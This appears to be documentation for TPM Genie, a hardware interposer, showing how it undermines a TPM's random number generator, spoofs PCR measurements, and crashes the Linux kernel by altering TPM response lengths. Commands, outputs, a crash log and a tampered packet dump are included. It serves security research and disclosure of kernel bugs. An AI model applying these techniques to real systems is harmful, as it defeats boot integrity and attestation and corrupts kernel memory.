# TPM Attack Demonstrations

TPM Genie comes pre-configured to conduct a number of attacks against the Linux kernel. These different attack modes are explained below.



## Undermining the Hardware Random Number Generator

To demonstrate attacks against the TPM hardware RNG, first ensure that the `tpm_rng` kernel module is loaded. 

When the TPM is in default passthrough mode, the returned data appears to be suitably random:

```
$ sudo dd if=/dev/hwrng count=1 bs=16 | hexdump
1+0 records in
1+0 records out
16 bytes (16 B) copied, 0.152077 s, 0.1 kB/s
0000000 01 91 55 54 57 06 15 be 4b e3 ba b7 ca 5a c5 a8
0000010
```

However, when TPM Genie is allowed to interpose the `TPM_ORD_GetRandom` command ordinal (press `m` key in the console until `Alter Hardware RNG` state is entered), we observe entirely different output from the HWRNG.

```
$ sudo dd if=/dev/hwrng count=1 bs=16 | hexdump
1+0 records in
1+0 records out
16 bytes (16 B) copied, 0.152077 s, 0.1 kB/s
0000000 aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa
0000010
```

## Spoofing PCR Measurements

In order to demonstrate the act of spoofing PCR measurements, a few simple utilities are provided. The `utils/pcr_extend.py` and `utils/pcr_read.py` scripts can be run on the victim to interact with the `/dev/tpm0` character device and issue `TPM_ORD_PcrExtend` and `TPM_ORD_PcrRead` commands to the TPM chip.

First, we demonstrate normal operation of the PCR Extend ordinal by measuring the string “hello world” and extending the SHA-1 digest into PCR index 1.

```
$ echo -n -e “hello world” > extend_data
$ sudo python3 pcr_extend.py -i 1 -f extend_data

[*] Reading this file:        pcr_extend_data
[*] Computed this digest:     2aae6c35c94fcfb415dbe95f408b9ce91ee846ed
[*] Extending into PCR index: 1
[*] Output digest:            54c528f774ceb1f270ba5349fcabc2a1bd1f10d4

$ sudo python3 pcr_read.py -i 1

PCR  1: 54 c5 28 f7 74 ce b1 f2 70 ba 53 49 fc ab c2 a1 bd 1f 10 d4
```

Next, we demonstrate how the PCR value changes if we modify the string that is measured. The resultant digest is extended into PCR index 2.

```
$ echo -n -e “evil” > other_data
$ sudo python3 pcr_extend.py -i 2 -f extend_data

[*] Reading this file:        other_data
[*] Computed this digest:     b653891162a040e1bfe6e436bdcd93827e0c56e5
[*] Extending into PCR index: 2
[*] Output digest:            ede6e014e28a3458c1dd1aa26f0716616f77384a

$ sudo python3 pcr_read.py -i 2

PCR  2: ed 66 e0 14 e2 8a 34 58 c1 dd 1a a2 6f 07 16 61 6f 77 38 4a
```

Finally, we put TPM Genie into `SPOOF_PCR_EXTEND` mode (press the `m` key). Once again, we attempt to extend the tampered file into PCR index 3.

```
$ sudo python3 pcr_extend.py -i 3 -f other_data

[*] Reading this file:        other_data
[*] Computed this digest:     b653891162a040e1bfe6e436bdcd93827e0c56e5
[*] Extending into PCR index: 3
[*] Output digest:            54c528f774ceb1f270ba5349fcabc2a1bd1f10d4

$ python3 pcr_read.py -i 3

PCR  3: 54 c5 28 f7 74 ce b1 f2 70 ba 53 49 fc ab c2 a1 bd 1f 10 d4
```

Notice that this new PCR value (index 3) is identical to the first PCR value that was set prior to tampering with the measured file (index 1). TPM Genie has replaced the digest of the string “evil” with the digest of the string “hello world” as it was transmitted over the serial bus.

## Inducing Kernel Memory Corruption

During my TPM Interposer research, I discovered a number of kernel vulnerabilities, whereby an interposer could trigger memory corruption by altering TPM response packets. The patches for these bugs are most likely going to land in kernel version `v4.16`.

TPM Genie is able to trigger one such kernel memory corruption bug out-of-the-box. Simply switch interposer modes until you arrive at the `Trigger Kernel Crash` mode. You must also ensure that the `tpm_rng` kernel module is loaded on the victim, then execute the following command:

```
$ sudo dd if=/dev/hwrng bs=1 count=64 | hexdump -C
```

You should see a crash look something like this:

```
[  300.232615] Unable to handle kernel paging request at virtual address c3487d00
[  300.234638] Unable to handle kernel paging request at virtual address 1f11141c
[  300.234645] pgd = 80004000
[  300.234655] [1f11141c] *pgd=00000000
[  300.234672] Internal error: Oops: 80000005 [#1] PREEMPT SMP ARM
[  300.234733] Modules linked in: tpm_rng cfg80211 rfkill tpm_i2c_infineon tpm spi_bcm2835 i2c_bcm2708 bcm2835_gpiom]
[  300.234745] CPU: 3 PID: 0 Comm: swapper/3 Not tainted 4.1.21-v7+ #1
[  300.234750] Hardware name: BCM2709
[  300.234757] task: b9904800 ti: b9936000 task.ti: b9936000
[  300.234768] PC is at 0x1f11141c
[  300.234786] LR is at rcu_process_callbacks+0x65c/0x7a4
[  300.234796] pc : [<1f11141c>]    lr : [<80079620>]    psr: 20000113
[  300.234796] sp : b9937e40  ip : b9214200  fp : b9937e9c
[  300.234801] r10: b9936000  r9 : b9f8fc1c  r8 : 0000000a
[  300.234807] r7 : 1f01141e  r6 : b7373a94  r5 : 00000002  r4 : 00000000
[  300.234814] r3 : 808964c0  r2 : 00000000  r1 : 1f11141e  r0 : b7373a94
```

This proof of concept works very simply. The log from TPM Genie shows exactly what has happened. The TPM hardware returned the expected number of random bytes (`64`), however, TPM Genie altered the `rng_data_len` field from `0x0040` to `0x0FFF`, resuling in a very large memory copy.

```
|        Tnsy < TPM |        | 00 00 00 40 C2 9C 65 93 DC 14 B8 BD 64 90 E0 7A
|                   |        | 2F 1E C8 84 74 57 A9 9B EC 59 9E 6D C8 F5 7E D2
|                   |        | 7B D4 BA 67 01 7D B9 DA 7A 18 22 D3 E8 1D E0 A6
|                   |        | E8 6C 5F 34 77 EA 68 FC 64 02 12 51 13 35 12 F1
|                   |        | 14 D3 F2 3E
|-------------------|--------|--------------------------------
| Host < Tnsy       |        | 00 00 0F FF 41 41 41 41 41 41 41 41 41 41 41 41
|                   |        | 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
|                   |        | 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
|                   |        | 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
|                   |        | 41 41 41 41
```


